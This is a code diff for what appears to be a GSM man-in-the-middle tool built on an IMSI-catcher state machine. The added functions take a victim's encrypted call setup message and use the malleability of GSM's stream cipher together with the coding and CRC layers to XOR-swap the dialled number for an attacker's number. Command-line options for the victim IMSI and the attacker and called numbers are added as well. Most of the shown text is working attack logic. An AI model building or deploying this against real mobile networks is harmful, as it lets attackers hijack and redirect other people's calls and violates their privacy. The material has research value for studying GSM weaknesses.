@@ -86,16 +86,18 @@ static int port = DEFAULT_MCAST_PORT;
 static struct virt_um_inst *downlink = NULL;
 static struct virt_um_inst *uplink = NULL;
 
+static uint32_t intercept_arfcn = 666;
 static enum mitm_state mitm_state = STATE_IMSI_CATCHER_SABM;
 static struct pending_setup_intercept pending_setup_interc;
 static struct pending_identity_request pending_identity_req;
-LLIST_HEAD(subscribers);
-static uint32_t intercept_arfcn = 666;
+static LLIST_HEAD(subscribers);
 
-static char imsi_victim[GSM_EXTENSION_LENGTH + 1] = "901700000000403";
-static char msisdn_victim[GSM_EXTENSION_LENGTH + 1] = "017519191919";
-static char msisdn_called[GSM_EXTENSION_LENGTH + 1] = "017518181818";
-static char msisdn_attacker[GSM_EXTENSION_LENGTH + 1] = "017517171717";
+
+static char *imsi_victim; // victims imsi
+static char *msisdn_called; // called telephone number
+static char *msisdn_attacker; // attacker telephone number
+static int msidn_offset_from_l2_hdr = 3 + 11; // bytes between bcd coded msisdn and start of lapdm header
+
 
 static void handle_options(int argc, char **argv)
 {
@@ -106,11 +108,14 @@ static void handle_options(int argc, char **argv)
 			{"dl-tx-grp", 1, 0, 'w'},
 		        {"ul-rx-grp", 1, 0, 'x'},
 		        {"ul-tx-grp", 1, 0, 'y'},
-		        {"port", 1, 0, 'z'},
+		        {"imsi-victim", 1, 0, 'a'},
+		        {"msisdn-called", 1, 0, 'b'},
+		        {"msisdn-attacker", 1, 0, 'c'},
+		        {"msisdn-to-setup-offset", 1, 0, 'd'},
 		        {0, 0, 0, 0},
 		};
 
-		c = getopt_long(argc, argv, "z:y:x:w:v:", long_options,
+		c = getopt_long(argc, argv, "z:y:x:w:v:a:b:c:d:", long_options,
 		                &option_index);
 		if (c == -1)
 			break;
@@ -131,31 +136,120 @@ static void handle_options(int argc, char **argv)
 		case 'z':
 			port = atoi(optarg);
 			break;
+
+		case 'a':
+			imsi_victim = optarg;
+			break;
+
+		case 'b':
+			msisdn_called = optarg;
+			break;
+
+		case 'c':
+			msisdn_attacker = optarg;
+			break;
+
+		case 'd':
+			msidn_offset_from_l2_hdr = 3 + atoi(optarg);
+			break;
 		default:
 			break;
 		}
 	}
 }
 
-int is_channel(struct chan_desc * chan, uint8_t timeslot, uint8_t subslot, uint8_t chan_type) {
+static int is_channel(struct chan_desc * chan, uint8_t timeslot, uint8_t subslot, uint8_t chan_type) {
 	return chan->type == chan_type && chan->subchan == subslot && chan->timeslot == timeslot;
 }
 
-void set_channel(struct chan_desc * chan, uint8_t timeslot, uint8_t subslot, uint8_t chan_type) {
+static void set_channel(struct chan_desc * chan, uint8_t timeslot, uint8_t subslot, uint8_t chan_type) {
 	chan->type = chan_type;
 	chan->timeslot = timeslot;
 	chan->subchan = subslot;
 }
 
-void log_state_change(uint8_t from, uint8_t to) {
+static void log_state_change(uint8_t from, uint8_t to) {
 	fprintf(stderr, "%s -> %s\n", get_value_string(vs_mitm_states, from), get_value_string(vs_mitm_states, to));
 }
 
-void manipulate_setup_message(uint8_t *msg) {
- // TODO: manipulate message
+static void manip_enc_lapdm_frame(uint8_t *manip_enc, uint8_t *data_enc, uint16_t data_enc_len_bytes, uint8_t *data_xor_manip) {
+
+	uint8_t data_xor_manip_cc[LEN_CC] = {0};
+	uint8_t crc_remainder_cc[LEN_CC] = {0};
+	uint8_t data_cc[LEN_CC] = {0};
+	uint8_t crc_remainder[LEN_CRC / 8 + 1] = {0};
+	int i;
+
+	// init crc remainder
+	for(i = LEN_PLAIN / 8; i < LEN_CRC / 8; ++i) {
+		crc_remainder[i] = 0xff;
+	}
+	crc_remainder[i] = 0xf0;
+
+	fprintf(stderr, "data XOR manip = %s\n", osmo_hexdump(data_xor_manip, LEN_PLAIN / 8));
+	fprintf(stderr, "remainder = %s\n", osmo_hexdump(crc_remainder, LEN_CRC / 8 + 1));
+	fprintf(stderr, "[ciph]map(il((cc(crc(data))))) = %s\n", osmo_hexdump(data_enc, data_enc_len_bytes));
+
+	if(data_enc_len_bytes != LEN_BURSTMAP_XCCH / 8 && data_enc_len_bytes != LEN_BURSTMAP_FACCH / 8) {
+		return;
+	}
+
+	// -> cc(crc(data XOR manip))
+	xcch_encode(PLAIN, data_xor_manip, NULL, NULL, data_xor_manip_cc, NULL);
+	fprintf(stderr, "cc(crc(data XOR manip)) = %s\n", osmo_hexdump(data_xor_manip_cc, LEN_CC / 8));
+	// -> cc(crc_remainder)
+	xcch_encode(CRC, crc_remainder, NULL, NULL, crc_remainder_cc, NULL);
+	fprintf(stderr, "cc(remainder) = %s\n", osmo_hexdump(crc_remainder_cc, LEN_CC / 8));
+	// -> cc(crc(data XOR manip)) XOR cc(crc_remainder)
+	xor_data(data_xor_manip_cc, data_xor_manip_cc, crc_remainder_cc, LEN_CC / 8);
+	fprintf(stderr, "cc(crc(data XOR manip)) XOR cc(remainder) = %s\n", osmo_hexdump(data_xor_manip_cc, LEN_CC / 8));
+	// get ciph(cc(crc(data))) from mapped and interleaved data
+	if(data_enc_len_bytes == LEN_BURSTMAP_XCCH / 8) {
+		xcch_decode(BURSTMAP_XCCH, data_enc, NULL, data_cc, NULL, NULL);
+	} else if(data_enc_len_bytes == LEN_BURSTMAP_FACCH / 8) {
+		facch_decode(BURSTMAP_FACCH, data_enc, NULL, data_cc, NULL, NULL);
+	}
+	fprintf(stderr, "[ciph](cc(crc(data))) = %s\n", osmo_hexdump(data_cc, LEN_CC / 8));
+	// -> cc(crc(data XOR manip)) XOR cc(crc_remainder) XOR ciph(cc(crc(data))) == ciph(cc(crc(manip)))
+	xor_data(data_cc, data_xor_manip_cc, data_cc, LEN_CC / 8);
+	fprintf(stderr, "cc(crc(data XOR manip)) XOR cc(remainder) XOR [ciph](cc(crc(data))) = %s\n", osmo_hexdump(data_cc, LEN_CC / 8));
+
+	// wichtig! die aus dem burst mapping kommenden stealing bits sind nicht verschlüsselt!
+	// deshalb dürfen wir den dekodierten und manipulierten cc data stream im anschluss einfach wieder interleaven und mappen
+	if(data_enc_len_bytes == LEN_BURSTMAP_XCCH / 8) {
+		xcch_encode(CC, data_cc, manip_enc, NULL, NULL, NULL);
+	} else if(data_enc_len_bytes == LEN_BURSTMAP_FACCH / 8) {
+		facch_encode(CC, data_cc, manip_enc, NULL, NULL, NULL);
+	}
+	fprintf(stderr, "map(il(cc(crc(data XOR manip)) XOR cc(remainder) XOR [ciph](cc(crc(data))))) == [ciph](map(il(cc(crc(manip))))) = %s\n", osmo_hexdump(manip_enc, LEN_CC / 8));
 }
 
-int check_subscriber(struct map_imsi_tmsi *subscriber) {
+
+static void manip_setup_msg(uint8_t *manip_msg_enc, uint8_t *msg_enc, uint16_t msg_enc_len_bytes) {
+
+	uint8_t bcd_len = (strlen(msisdn_called)) / 2 + (strlen(msisdn_called) % 2);
+	uint8_t data_xor_manip[LEN_PLAIN / 8] = {0};
+	uint8_t bcd_called[bcd_len];
+	uint8_t bcd_attacker[bcd_len];
+
+	// manually initialization with 0
+	memset( bcd_called, 0, bcd_len*sizeof(uint8_t) );
+	memset( bcd_attacker, 0, bcd_len*sizeof(uint8_t) );
+
+	gsm48_encode_bcd_number(bcd_called, strlen(msisdn_called), -1, msisdn_called);
+	gsm48_encode_bcd_number(bcd_attacker, strlen(msisdn_attacker), -1, msisdn_attacker);
+
+	fprintf(stderr, "Replacing ... \n");
+	fprintf(stderr, "called bcd = %s\n", osmo_hexdump(bcd_called, bcd_len));
+	fprintf(stderr, "attacker bcd = %s\n", osmo_hexdump(bcd_attacker, bcd_len));
+
+	xor_data(&data_xor_manip[msidn_offset_from_l2_hdr], bcd_called, bcd_attacker, bcd_len);
+
+	manip_enc_lapdm_frame(manip_msg_enc, msg_enc, msg_enc_len_bytes, data_xor_manip);
+
+}
+
+static int check_subscriber(struct map_imsi_tmsi *subscriber) {
 
 	if(subscriber == NULL) {
 		return SUBSCRIBER_TYPE_OTHER;
@@ -167,7 +261,7 @@ int check_subscriber(struct map_imsi_tmsi *subscriber) {
 	return strcmp(subscriber->imsi, imsi_victim) == 0 ? SUBSCRIBER_TYPE_VICTIM : SUBSCRIBER_TYPE_OTHER;
 }
 
-struct map_imsi_tmsi* get_subscriber(uint8_t *mi, int mi_len) {
+static struct map_imsi_tmsi* get_subscriber(uint8_t *mi, int mi_len) {
 
 	uint8_t mi_type;
 	char mi_string[GSM48_MI_SIZE];
@@ -364,7 +458,8 @@ forward_msg:
 
 static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 {
-	uint8_t encoded_msg[LEN_PLAIN / 8] = {0};
+	uint8_t encoded_msg[LEN_BURSTMAP_XCCH / 8] = {0};
+	uint8_t encoded_manip_msg[LEN_BURSTMAP_XCCH / 8] = {0};
 	struct gsmtap_hdr *gh = msgb_l1(msg);
 	uint8_t *l2_hdr;
 	struct gsm48_hdr *l3_hdr;
@@ -493,14 +588,8 @@ static void uplink_rcv_cb(struct virt_um_inst *vui, struct msgb *msg)
 
 				// encode message as virtual layer does not support encoding right now
 				xcch_encode(PLAIN, msgb_data(msg), encoded_msg, NULL, NULL, NULL);
-				manipulate_setup_message(encoded_msg);
-				xcch_decode(BURSTMAP_XCCH, encoded_msg, NULL, NULL, NULL, manip_msg->l2h);
-
-				// test manip
-				msgb_data(manip_msg)[32] = 0x11;
-				msgb_data(manip_msg)[33] = 0x11;
-				msgb_data(manip_msg)[34] = 0x11;
-
+				manip_setup_msg(encoded_manip_msg, encoded_msg, LEN_BURSTMAP_XCCH / 8);
+				xcch_decode(BURSTMAP_XCCH, encoded_manip_msg, NULL, NULL, NULL, manip_msg->l2h);
 
 				mitm_state = STATE_IMSI_CATCHER_SABM;
 				log_state_change(STATE_INTERCEPT_SETUP, STATE_IMSI_CATCHER_SABM);
@@ -574,7 +663,6 @@ free_msg:
 
 int main(int argc, char **argv)
 {
-
 	fprintf(stderr, "STARTUP...\n");
 
 	handle_options(argc, argv);
